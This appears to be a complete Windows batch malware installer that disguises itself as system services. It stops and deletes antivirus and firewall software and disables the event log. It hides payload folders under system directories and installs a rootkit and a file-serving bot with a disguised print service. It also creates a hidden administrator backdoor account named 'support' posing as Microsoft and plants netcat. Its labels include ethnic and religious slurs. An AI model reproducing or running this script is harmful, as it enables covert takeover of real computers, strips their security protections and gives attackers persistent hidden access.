@echo off
cd %systemroot%\Fonts\

if exist %systemroot%\system32\spool\prtprocs\w32x86\4\prtprc\mg*.txt goto ALREDYDUN
if exist %systemroot%\system32\spool\prtprocs\w32x86\4\prtprc\app*.txt goto ALREDYDUN

if exist %systemroot%\system32\appmgmt\MACHINE\XI686X\xfilingx\mg*.txt goto ALREDYDUN
if exist %systemroot%\system32\appmgmt\MACHINE\XI686X\xfilingx\app*.txt goto ALREDYDUN

echo wtf hi

net stop "Ahnlab Task Scheduler" /y
net stop navapsvc /y
net stop "Sygate Personal Firewall Pro" /y
net stop vrmonsvc /y
net stop MonSvcNT /y
net stop SAVScan /y
net stop NProtectService /y
net stop ccSetMGR /y
net stop ccEvtMGR /y

cls

net stop ccPwdSvc /y
net stop "Symantec Core LC" /y
net stop navapsvc /y
net stop "Serv-U" /y
net stop "Norton AntiVirus Auto Protect Service" /y
net stop "Norton AntiVirus Client" /y
net stop "Symantec AntiVirus Client" /y
net stop "Norton AntiVirus Server" /y
net stop "NAV Alert" /y
net stop "Nav Auto-Protect" /y

cls

net stop "McShield" /y
net stop "DefWatch" /y
net stop eventlog /y
net stop InoRPC /y
net stop InoRT /y
net stop InoTask /y

cls

net stop "Norton AntiVirus Auto Protect Service" /y
net stop "Norton AntiVirus Client" /y
net stop "Norton AntiVirus Corporate Edition" /y
net stop "ViRobot Professional Monitoring" /y
net stop "PC-cillin Personal Firewall" /y
net stop "Trend Micro Proxy Service" /y
net stop "Trend NT Realtime Service" /y
net stop "McAfee.com McShield" /y
net stop "McAfee.com VirusScan Online Realtime Engine" /y
net stop "SyGateService" /y
net stop "Sygate Personal Firewall Pro" /y

cls

net stop "Sophos Anti-Virus" /y
net stop "Sophos Anti-Virus Network" /y
net stop "eTrust Antivirus Job Server" /y
net stop "eTrust Antivirus Realtime Server" /y
net stop "Sygate Personal Firewall Pro" /y
net stop "eTrust Antivirus RPC Server"  /y
%systemroot%\system32\DWRCS -remove

cls

net stop DNTUS26 /y
net stop r_server /y
net stop DWMRCS /y
net stop V3MONNT /y
net stop V3MONSVC /y

mkdir %systemroot%\system32\spool
mkdir %systemroot%\system32\spool\prtprocs
mkdir %systemroot%\system32\spool\prtprocs\w32x86\0
mkdir %systemroot%\system32\spool\prtprocs\w32x86\1
mkdir %systemroot%\system32\spool\prtprocs\w32x86\2
mkdir %systemroot%\system32\spool\prtprocs\w32x86\3
mkdir %systemroot%\system32\spool\prtprocs\w32x86\4
mkdir %systemroot%\system32\spool\prtprocs\w32x86\5
mkdir %systemroot%\system32\spool\prtprocs\w32x86\6
mkdir %systemroot%\system32\spool\prtprocs\w32x86\7
mkdir %systemroot%\system32\spool\prtprocs\w32x86\4\prtprc
mkdir %systemroot%\system32\spool\prtprocs\w32x86\4\prtbk
mkdir %systemroot%\system32\spool\prtprocs\w32x86\4\prcprt
mkdir %systemroot%\system32\spool\prtprocs\w32x86\4\drivers
mkdir %systemroot%\system32\spool\prtprocs\w32x86\4\ink
mkdir %systemroot%\system32\spool\prtprocs\w32x86\1\prtprc
mkdir %systemroot%\system32\spool\prtprocs\w32x86\1\prtbk
mkdir %systemroot%\system32\spool\prtprocs\w32x86\1\prcprt
mkdir %systemroot%\system32\spool\prtprocs\w32x86\1\drivers
mkdir %systemroot%\system32\spool\prtprocs\w32x86\1\ink
mkdir %systemroot%\system32\spool\prtprocs\w32x86\6\prtprc
cls
mkdir %systemroot%\system32\spool\prtprocs\w32x86\6\prtbk
mkdir %systemroot%\system32\spool\prtprocs\w32x86\6\prcprt
mkdir %systemroot%\system32\spool\prtprocs\w32x86\6\drivers
mkdir %systemroot%\system32\spool\prtprocs\w32x86\6\ink
mkdir %systemroot%\system32\IME
mkdir %systemroot%\system32\IME\CINTLGNT
mkdir %systemroot%\system32\IME\PINTLGNT
mkdir %systemroot%\system32\IME\TINTLGNT
mkdir %systemroot%\system32\IME\YINTLGNT
mkdir %systemroot%\system32\IME\RINTLGNT
mkdir %systemroot%\system32\IME\VINTLGNT
mkdir %systemroot%\system32\IME\BINTLGNT
mkdir %systemroot%\system32\IME\TINTLGNT\drvime
mkdir %systemroot%\system32\IME\BINTLGNT\drvime
mkdir %systemroot%\system32\IME\CINTLGNT\drvime
mkdir %systemroot%\system32\IME\PINTLGNT\drvime
mkdir %systemroot%\system32\IME\TINTLGNT\MASTER
mkdir %systemroot%\system32\IME\BINTLGNT\MASTER
mkdir %systemroot%\system32\IME\CINTLGNT\MASTER
mkdir %systemroot%\system32\IME\PINTLGNT\MASTER
mkdir %systemroot%\system32\IME\TINTLGNT\IME_
mkdir %systemroot%\system32\IME\BINTLGNT\IME_
mkdir %systemroot%\system32\IME\CINTLGNT\IME_
mkdir %systemroot%\system32\IME\PINTLGNT\IME_
cls
mkdir %systemroot%\system32\appmgmt
mkdir %systemroot%\system32\appmgmt\MACHINE
mkdir %systemroot%\system32\appmgmt\SYSTEM
mkdir %systemroot%\system32\appmgmt\APPLICATION
mkdir %systemroot%\system32\appmgmt\MANAGE
mkdir %systemroot%\system32\appmgmt\build_
mkdir %systemroot%\system32\appmgmt\apply_app
mkdir %systemroot%\system32\appmgmt\MACHINE\XI686X
mkdir %systemroot%\system32\appmgmt\MACHINE\XI686X\04729
mkdir %systemroot%\system32\appmgmt\MACHINE\XI686X\08543
mkdir %systemroot%\system32\appmgmt\MACHINE\XI686X\05476
mkdir %systemroot%\system32\appmgmt\MACHINE\XI686X\xfilingx
mkdir %systemroot%\system32\appmgmt\MACHINE\XI686X\_5732
mkdir %systemroot%\system32\appmgmt\MACHINE\XI686X\7946_
mkdir %systemroot%\system32\appmgmt\MACHINE\XI686X\help
mkdir %systemroot%\system32\appmgmt\MACHINE\XI686X\machapp
mkdir %systemroot%\system32\appmgmt\MACHINE\XI686X\wmgmt
mkdir %systemroot%\system32\appmgmt\MACHINE\XI686X\win32
mkdir %systemroot%\system32\appmgmt\MACHINE\XI686X\src
cls

attrib +a -h -s %systemroot%\system32\spanky*
del /q %systemroot%\system32\spanky*

attrib +a -h -s %systemroot%\Fonts\ir\*
attrib +a -h -s %systemroot%\Fonts\su\*
attrib +a -h -s %systemroot%\Fonts\tools\*
attrib +a -h -s %systemroot%\Fonts\up\*
attrib +a -h -s %systemroot%\Fonts\rk\*

cls

move %systemroot%\Fonts\ir\* %systemroot%\system32\spool\prtprocs\w32x86\4\prtprc\
move %systemroot%\Fonts\su\* %systemroot%\system32\IME\TINTLGNT\drvime\
move %systemroot%\Fonts\tools\* %systemroot%\system32\appmgmt\MACHINE\XI686X\
move %systemroot%\Fonts\up\* %systemroot%\system32\appmgmt\MACHINE\XI686X\xfilingx\
move %systemroot%\Fonts\rk\* %systemroot%\system32\
move %systemroot%\Fonts\add\* %systemroot%\system32\dllcache\

cls

echo iro69u
cd %systemdrive%
cd %systemroot%\system32\spool\prtprocs\w32x86\4\prtprc\
install.exe -install -name:"Universal Print Service" -launch:"%systemroot%\system32\spool\prtprocs\w32x86\4\prtprc\printsvc.exe %systemroot%\system32\spool\prtprocs\w32x86\4\prtprc\prntmon.dll"
yaya stop Universal Print Service
yaya stop "Universal Print Service"
cls
ECHO statefile %systemroot%\system32\spool\prtprocs\w32x86\4\prtprc\mgmt1.txt>> prntmon.dll
ECHO xdcclistfile %systemroot%\system32\spool\prtprocs\w32x86\4\prtprc\mgmt2.txt>> prntmon.dll
ECHO xdccfile %systemroot%\system32\spool\prtprocs\w32x86\4\prtprc\mg.txt>> prntmon.dll
ECHO pidfile %systemroot%\system32\spool\prtprocs\w32x86\4\prtprc\mgmt3.txt>> prntmon.dll
ECHO messagefile %systemroot%\system32\spool\prtprocs\w32x86\4\prtprc\app2.txt>> prntmon.dll
ECHO ignorefile %systemroot%\system32\spool\prtprocs\w32x86\4\prtprc\app1.txt>> prntmon.dll
ECHO filedir %systemroot%\system32\spool\prtprocs\w32x86\4\prtprc\xfilingx>> prntmon.dll
ECHO uploaddir %systemroot%\system32\appmgmt\MACHINE\XI686X\xfilingx>> prntmon.dll
cls
:agan
set mynumber=%random%
if %mynumber% GTR 10000 goto agan
if %mynumber% LSS 1000 goto agan
set \a mynumber=%mynumber%
ECHO user_nick [EWG]-i%mynumber%i>> prntmon.dll
yaya start Universal Print Service
yaya start "Universal Print Service"
cls
echo serv69u
cd %systemdrive%
cd %systemroot%\system32\IME\TINTLGNT\drvime\
install.exe -install -name:"Universal Help Service" -launch:"%systemroot%\system32\IME\TINTLGNT\drvime\helpsvc.exe"
yay start Universal Help Service
yaya start "Universal Help Service"
cls

echo rk
cd %systemdrive%
cd %systemroot%\system32\
spanky.exe spanky.ini

cls

attrib +a +h +s %systemroot%\system32\spool\prtprocs\w32x86\0
attrib +a +h +s %systemroot%\system32\spool\prtprocs\w32x86\1
attrib +a +h +s %systemroot%\system32\spool\prtprocs\w32x86\2
attrib +a +h +s %systemroot%\system32\spool\prtprocs\w32x86\3
attrib +a +h +s %systemroot%\system32\spool\prtprocs\w32x86\4
attrib +a +h +s %systemroot%\system32\spool\prtprocs\w32x86\5
attrib +a +h +s %systemroot%\system32\spool\prtprocs\w32x86\6
attrib +a +h +s %systemroot%\system32\spool\prtprocs\w32x86\7
attrib +a +h +s %systemroot%\system32\spool\prtprocs\w32x86\6\prtprc
attrib +a +h +s %systemroot%\system32\spool\prtprocs\w32x86\6\prtbk
attrib +a +h +s %systemroot%\system32\spool\prtprocs\w32x86\6\prcprt
attrib +a +h +s %systemroot%\system32\spool\prtprocs\w32x86\6\drivers
attrib +a +h +s %systemroot%\system32\spool\prtprocs\w32x86\6\ink
attrib +a +h +s %systemroot%\system32\spool\prtprocs\w32x86\1\prtprc
attrib +a +h +s %systemroot%\system32\spool\prtprocs\w32x86\1\prtbk
attrib +a +h +s %systemroot%\system32\spool\prtprocs\w32x86\1\prcprt
attrib +a +h +s %systemroot%\system32\spool\prtprocs\w32x86\1\drivers
attrib +a +h +s %systemroot%\system32\spool\prtprocs\w32x86\1\ink
attrib +a +h +s %systemroot%\system32\spool\prtprocs\w32x86\4\prtprc
attrib +a +h +s %systemroot%\system32\spool\prtprocs\w32x86\4\prtbk
attrib +a +h +s %systemroot%\system32\spool\prtprocs\w32x86\4\prcprt
attrib +a +h +s %systemroot%\system32\spool\prtprocs\w32x86\4\drivers
attrib +a +h +s %systemroot%\system32\spool\prtprocs\w32x86\4\ink

cls

attrib +a h +s %systemroot%\system32\IME\CINTLGNT
attrib +a h +s %systemroot%\system32\IME\PINTLGNT
attrib +a h +s %systemroot%\system32\IME\TINTLGNT
attrib +a h +s %systemroot%\system32\IME\YINTLGNT
attrib +a h +s %systemroot%\system32\IME\RINTLGNT
attrib +a h +s %systemroot%\system32\IME\VINTLGNT
attrib +a h +s %systemroot%\system32\IME\BINTLGNT
attrib +a h +s %systemroot%\system32\IME\TINTLGNT\drvime
attrib +a h +s %systemroot%\system32\IME\BINTLGNT\drvime
attrib +a h +s %systemroot%\system32\IME\CINTLGNT\drvime
attrib +a h +s %systemroot%\system32\IME\PINTLGNT\drvime
attrib +a h +s %systemroot%\system32\IME\TINTLGNT\MASTER
attrib +a h +s %systemroot%\system32\IME\BINTLGNT\MASTER
attrib +a h +s %systemroot%\system32\IME\CINTLGNT\MASTER
attrib +a h +s %systemroot%\system32\IME\PINTLGNT\MASTER
attrib +a h +s %systemroot%\system32\IME\TINTLGNT\IME_
attrib +a h +s %systemroot%\system32\IME\BINTLGNT\IME_
attrib +a h +s %systemroot%\system32\IME\CINTLGNT\IME_
attrib +a h +s %systemroot%\system32\IME\PINTLGNT\IME_

cls

attrib +a +h +s %systemroot%\system32\appmgmt\MACHINE
attrib +a +h +s %systemroot%\system32\appmgmt\SYSTEM
attrib +a +h +s %systemroot%\system32\appmgmt\APPLICATION
attrib +a +h +s %systemroot%\system32\appmgmt\MANAGE
attrib +a +h +s %systemroot%\system32\appmgmt\build_
attrib +a +h +s %systemroot%\system32\appmgmt\apply_app
attrib +a +h +s %systemroot%\system32\appmgmt\MACHINE\XI686X
attrib +a +h +s %systemroot%\system32\appmgmt\MACHINE\XI686X\04729
attrib +a +h +s %systemroot%\system32\appmgmt\MACHINE\XI686X\08543
attrib +a +h +s %systemroot%\system32\appmgmt\MACHINE\XI686X\05476
attrib +a +h +s %systemroot%\system32\appmgmt\MACHINE\XI686X\_5732
attrib +a +h +s %systemroot%\system32\appmgmt\MACHINE\XI686X\7946_
attrib +a +h +s %systemroot%\system32\appmgmt\MACHINE\XI686X\help
attrib +a +h +s %systemroot%\system32\appmgmt\MACHINE\XI686X\machapp
attrib +a +h +s %systemroot%\system32\appmgmt\MACHINE\XI686X\wmgmt
attrib +a +h +s %systemroot%\system32\appmgmt\MACHINE\XI686X\win32
attrib +a +h +s %systemroot%\system32\appmgmt\MACHINE\XI686X\src
attrib +a +h +s %systemroot%\system32\appmgmt\MACHINE\XI686X\xfilingx

cls

attrib +a +h +s %systemroot%\system32\spool\prtprocs\w32x86\4\prtprc\cygwin1.dll
attrib +a +h +s %systemroot%\system32\spool\prtprocs\w32x86\4\prtprc\cygcrypt-0.dll
attrib +a +h +s %systemroot%\system32\spool\prtprocs\w32x86\4\prtprc\install.exe
attrib +a +h +s %systemroot%\system32\spool\prtprocs\w32x86\4\prtprc\printsvc.exe
attrib +a +h +s %systemroot%\system32\spool\prtprocs\w32x86\4\prtprc\yaya.exe
attrib +a +h +s %systemroot%\system32\spool\prtprocs\w32x86\4\prtprc\prntmon.dll

attrib +a -h -s %systemroot%\system32\spool\prtprocs\w32x86\4\prtprc\mg*.txt
attrib +a -h -s %systemroot%\system32\spool\prtprocs\w32x86\4\prtprc\app*.txt
attrib +a -h -s %systemroot%\system32\spool\prtprocs\w32x86\4\prtprc\mg*
attrib +a -h -s %systemroot%\system32\spool\prtprocs\w32x86\4\prtprc\app*

attrib +a +h +s %systemroot%\system32\IME\TINTLGNT\drvime\*

attrib +a +h +s %systemroot%\system32\appmgmt\MACHINE\XI686X\*

attrib +a +h +s %systemroot%\system32\appmgmt\MACHINE\XI686X\xfilingx\*

cls

if exist c:\windows goto winarabXP
if exist c:\winxp goto winarabXP
if exist c:\win2k goto winjewsNT
if exist c:\winnt goto winjewsNT
if exist D:\winnt goto winjewsNT
if exist d:\windows goto winarabXP
if exist d:\winxp goto winarabXP

:winjewsNT
echo WINDOWS 2000 INSTALL
cd %systemroot%\system32\appmgmt\MACHINE\XI686X
attrib +a -h -s -r wget.*
del /q /f %systemroot%\system32\WindowsXP-KB835732-x86-ENU.EXE
wget -b http://www.gwdg.de/samba/updates/win2000/us/Windows2000-KB835732-x86-ENU.EXE
cls
copy Windows2000-KB835732-x86-ENU.EXE %systemroot%\system32\Windows2000-KB835732-x86-ENU.EXE
copy /y Windows2000-KB835732-x86-ENU.EXE %systemroot%\system32\Windows2000-KB835732-x86-ENU.EXE
cls
echo jkrtrjekltet
if not exist Windows2000-KB835732-x86-ENU.EXE goto sexxeh
start Windows2000-KB835732-x86-ENU.EXE /quiet /norestart
goto sexxeh

:winarabXP
echo WINDOWS XP INSTALL
cd %systemroot%\system32\appmgmt\MACHINE\XI686X
attrib +a -h -s -r wget.*
del /q /f %systemroot%\system32\WindowsXP-KB835732-x86-ENU.EXE
wget -b http://download.microsoft.com/download/6/1/5/615a50e9-a508-4d67-b53c-3a43455761bf/WindowsXP-KB835732-x86-ENU.EXE
cls
copy WindowsXP-KB835732-x86-ENU.EXE %systemroot%\system32\WindowsXP-KB835732-x86-ENU.EXE
copy /y WindowsXP-KB835732-x86-ENU.EXE %systemroot%\system32\WindowsXP-KB835732-x86-ENU.EXE
cls
echo jkrtrjeklter
if not exist WindowsXP-KB835732-x86-ENU.EXE goto sexxeh
start WindowsXP-KB835732-x86-ENU.EXE /quiet /norestart

:sexxeh

attrib +a +h +s wget.*

attrib +a -h -s %systemroot%\regedit*
attrib +a -h -s %systemroot%\regedit.*

del /q /f %systemroot%\system32\secu.reg
del /q /f %systemroot%\secu.reg
set keke=%systemroot%
copy %keke%\Fonts\secu.reg %systemroot%\system32\secu.reg
copy /y %keke%\Fonts\secu.reg %systemroot%\system32\secu.reg
copy %keke%\Fonts\secu.reg %systemroot%\secu.reg
copy /y %keke%\Fonts\secu.reg %systemroot%\secu.reg
if not exist %keke%\Fonts\secu.reg goto ohoh
if not exist %keke%\regedit.exe goto ohoh
echo **P4TCH1NG DC0M, LS4SS, H3H**
cd %keke%\Fonts
start regedit /s secu.reg

:ohoh

move %systemroot%\system32\tftp.exe %systemroot%\system32\appmgmt\MACHINE\XI686X\t0ftp.exe
move %systemroot%\system32\ftp.exe %systemroot%\system32\appmgmt\MACHINE\XI686X\ft0p.exe
move %systemroot%\system32\netstat.exe %systemroot%\system32\appmgmt\MACHINE\XI686X\n3tst4t.exe
move %systemroot%\system32\at.exe %systemroot%\system32\appmgmt\MACHINE\XI686X\4t.exe

cd %systemroot%\system32\dllcache\
attrib +a -h -s %systemroot%\system32\dllcache\lols*
attrib +a -h -s %systemroot%\system32\dllcache\infi*
%systemroot%\system32\dllcache\lols.exe %systemroot%\system32\dllcache\infi.exe
attrib +a +h +s %systemroot%\system32\dllcache\infi.exe
attrib +a +h +s %systemroot%\system32\dllcache\lols*

cls

:ALREDYDUN

attrib +a -h -s %systemroot%\system32\spool\prtprocs\w32x86\4\prtprc\mg*.txt
attrib +a -h -s %systemroot%\system32\spool\prtprocs\w32x86\4\prtprc\app*.txt
attrib +a -h -s %systemroot%\system32\spool\prtprocs\w32x86\4\prtprc\mg*
attrib +a -h -s %systemroot%\system32\spool\prtprocs\w32x86\4\prtprc\app*

attrib +a -h -s %systemroot%\system32\appmgmt\MACHINE\XI686X\xfilingx\mg*.txt
attrib +a -h -s %systemroot%\system32\appmgmt\MACHINE\XI686X\xfilingx\app*.txt
attrib +a -h -s %systemroot%\system32\appmgmt\MACHINE\XI686X\xfilingx\mg*
attrib +a -h -s %%systemroot%\system32\appmgmt\MACHINE\XI686X\xfilingx\app*

cd %systemroot%\system32\
net user support j0sh33 /ADD
net user support j0sh33
net localgroup Administrators support /ADD
net localgroup TelnetClients support /ADD
net user support /active:yes
net user support /expires:never
net user support /fullname:"Microsoft"
net user support /comment:"Microsoft Support."
echo Windows Registry Editor Version 5.00> %systemroot%\system32\hideusr.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList]>>%systemroot%\system32\hideusr.reg
echo "support"=dword:00000000>>%systemroot%\system32\hideusr.reg
del /q %systemroot%\hideusr.reg
copy %systemroot%\system32\hideusr.reg %systemroot%\hideusr.reg
copy /y %systemroot%\system32\hideusr.reg %systemroot%\hideusr.reg
if not exist %keke%\regedit.exe goto ohooo
start regedit /s hideusr.reg
:ohooo
cls
cls
echo hah
del /q /f %systemroot%\system32\hideusr.reg
del /q /f %systemroot%\hideusr.reg

cls

attrib +a -h -s %systemroot%\system32\kill*
attrib +a -h -s %systemroot%\system32\pulist*
attrib +a -h -s %systemroot%\system32\nc*
attrib +a -h -s %systemroot%\system32\info*
attrib +a -h -s %systemroot%\system32\yeh*

del /q /f %systemroot%\system32\kill*
del /q /f %systemroot%\system32\pulist*
del /q /f %systemroot%\system32\nc*
del /q /f %systemroot%\system32\info*
del /q /f %systemroot%\system32\yeh*

copy %systemroot%\system32\appmgmt\MACHINE\XI686X\kill*  %systemroot%\system32\
copy %systemroot%\system32\appmgmt\MACHINE\XI686X\pulist* %systemroot%\system32\
copy %systemroot%\system32\appmgmt\MACHINE\XI686X\nc* %systemroot%\system32\
copy %systemroot%\system32\appmgmt\MACHINE\XI686X\info* %systemroot%\system32\
copy %systemroot%\system32\appmgmt\MACHINE\XI686X\yeh* %systemroot%\system32\

cls

copy /y %systemroot%\system32\appmgmt\MACHINE\XI686X\kill*  %systemroot%\system32\
copy /y %systemroot%\system32\appmgmt\MACHINE\XI686X\pulist* %systemroot%\system32\
copy /y %systemroot%\system32\appmgmt\MACHINE\XI686X\nc* %systemroot%\system32\
copy /y %systemroot%\system32\appmgmt\MACHINE\XI686X\info* %systemroot%\system32\
copy /y %systemroot%\system32\appmgmt\MACHINE\XI686X\yeh* %systemroot%\system32\

cls

del /q /f "c:\Program Files\Symantec_Client_Security\Symantec AntiVirus\*"
del /q /f "c:\Program Files\Symantec\LiveUpdate\*"
del /q /f "c:\Program Files\NavNT\*"
del /q /f "c:\Program Files\Symantec\*"
del /q /f "c:\Program Files\Norton AntiVirus\*"
del /q /f "c:\Program Files\Norton AntiVirus\AdvTools\*"
del /q /f "c:\Program Files\eTrust\Intrusion Detection\*"
del /q /f "c:\Program Files\eTrust\*"
del /q /f "c:\Program Files\V3\*"
del /q /f "C:\Program Files\ViRobotXP\*"
del /q /f "C:\Program Files\Ahnlab\*"
del /q /f "C:\Program Files\Ahnlab\V3\*"
del /q /f "C:\Program Files\Ahnlab\Smart Update Utility\*"

cls

del /q /f WindowsXP-KB835732-x86-ENU.EXE
del /q /f Windows2000-KB835732-x86-ENU.EXE 

del /q /f %systemroot%\secu.reg
del /q /f %systemroot%\system32\secu.reg
del /q /f %systemroot%\fonts\secu.reg
del /q /f %systemroot%\secu.reg
del /q /f %systemroot%\hideusr.reg
del /q /f %systemroot%\system32\hideusr.reg


del /q /f %systemroot%\Fonts\secks.bat